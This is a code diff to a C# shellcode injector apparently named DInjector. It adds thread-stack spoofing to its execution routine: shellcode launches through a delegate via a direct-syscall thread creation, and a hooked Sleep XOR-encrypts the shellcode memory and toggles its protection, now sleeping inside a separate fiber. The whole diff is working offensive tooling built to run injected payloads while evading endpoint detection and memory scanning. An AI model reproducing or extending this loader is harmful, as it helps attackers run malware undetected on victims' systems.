@@ -9,7 +9,10 @@ namespace DInjector
 {
     class CurrentThread
     {
-        public static void Execute(byte[] shellcode, uint protect, uint timeout, int flipSleep, uint fluctuate, bool debug = false)
+        delegate void FunctionPtr();
+        delegate void RunShellcode(IntPtr shellcodeAddress);
+
+        public static void Execute(byte[] shellcode, uint protect, uint timeout, int flipSleep, uint fluctuate, bool spoofStack, bool debug = false)
         {
             uint allocProtect = 0, newProtect = 0;
             string strAllocProtect = "", strNewProtect = "";
@@ -83,7 +86,7 @@ namespace DInjector
                 #endregion
             }
 
-            var fs = new FluctuateShellcode(fluctuate, baseAddress, shellcode.Length, debug);
+            var fs = new FluctuateShellcode(fluctuate, spoofStack, baseAddress, shellcode.Length, debug);
             if (fluctuate != 0)
             {
                 var strFluctuate = "PAGE_READWRITE";
@@ -98,13 +101,13 @@ namespace DInjector
 
             IntPtr hThread = IntPtr.Zero;
 
-            ntstatus = Syscalls.NtCreateThreadEx(
+            ntstatus = Syscalls.NtCreateThreadExDelegate(
                 ref hThread,
                 DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                 IntPtr.Zero,
                 hProcess,
+                new RunShellcode(ChopChop),
                 baseAddress,
-                IntPtr.Zero,
                 suspended,
                 0,
                 0,
@@ -228,6 +231,12 @@ namespace DInjector
 
             Syscalls.NtClose(hThread);
         }
+
+        static void ChopChop(IntPtr shellcodeAddress)
+        {
+            FunctionPtr f = (FunctionPtr)Marshal.GetDelegateForFunctionPointer(shellcodeAddress, typeof(FunctionPtr));
+            f();
+        }
     }
 
     /// <summary>
@@ -237,7 +246,7 @@ namespace DInjector
     class FluctuateShellcode
     {
         delegate void Sleep(uint dwMilliseconds);
-        readonly Sleep sleepOrig;
+        readonly Sleep sleepOrig, sleepOrigMethod;
         readonly GCHandle gchSleepDetour;
 
         readonly IntPtr sleepOriginAddress, sleepDetourAddress;
@@ -250,17 +259,22 @@ namespace DInjector
         };
 
         readonly uint fluctuateWith;
+        readonly bool enableThreadStackSpoofing;
         readonly IntPtr shellcodeAddress;
         readonly int shellcodeLength;
         readonly byte[] xorKey;
         readonly bool printDebug;
 
-        public FluctuateShellcode(uint fluctuate, IntPtr shellcodeAddr, int shellcodeLen, bool debug)
+        IntPtr mainFiber = IntPtr.Zero;
+        uint sleepTime;
+
+        public FluctuateShellcode(uint fluctuate, bool spoofStack, IntPtr shellcodeAddr, int shellcodeLen, bool debug)
         {
             sleepOriginAddress = DI.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "Sleep");
             sleepOrig = (Sleep)Marshal.GetDelegateForFunctionPointer(sleepOriginAddress, typeof(Sleep));
-
             Marshal.Copy(sleepOriginAddress, sleepOriginBytes, 0, 16);
+
+            sleepOrigMethod = new Sleep(SleepOrig);
 
             var sleepDetour = new Sleep(SleepDetour);
             sleepDetourAddress = Marshal.GetFunctionPointerForDelegate(sleepDetour);
@@ -277,10 +291,10 @@ namespace DInjector
                 trampoline[i + 2] = sleepDetourBytes[i];
 
             fluctuateWith = fluctuate;
+            enableThreadStackSpoofing = spoofStack;
             shellcodeAddress = shellcodeAddr;
             shellcodeLength = shellcodeLen;
             xorKey = GenerateXorKey();
-
             printDebug = debug;
         }
 
@@ -292,13 +306,32 @@ namespace DInjector
             DisableHook();
         }
 
+        void SleepOrig(uint dwMilliseconds)
+        {
+            sleepOrig(sleepTime);
+            Win32.SwitchToFiber(mainFiber);
+        }
+
         void SleepDetour(uint dwMilliseconds)
         {
             DisableHook();
             ProtectMemory(fluctuateWith, printDebug);
             XorMemory();
 
-            sleepOrig(dwMilliseconds);
+            if (enableThreadStackSpoofing)
+            {
+                if (mainFiber == IntPtr.Zero)
+                    mainFiber = Win32.ConvertThreadToFiber(IntPtr.Zero);
+
+                sleepTime = dwMilliseconds;
+                var sleepFiber = Win32.CreateFiber(0, sleepOrigMethod, IntPtr.Zero);
+                Win32.SwitchToFiber(sleepFiber);
+                Win32.DeleteFiber(sleepFiber);
+            }
+            else
+            {
+                sleepOrig(dwMilliseconds);
+            }
 
             XorMemory();
             ProtectMemory(DI.Data.Win32.WinNT.PAGE_EXECUTE_READ, printDebug);
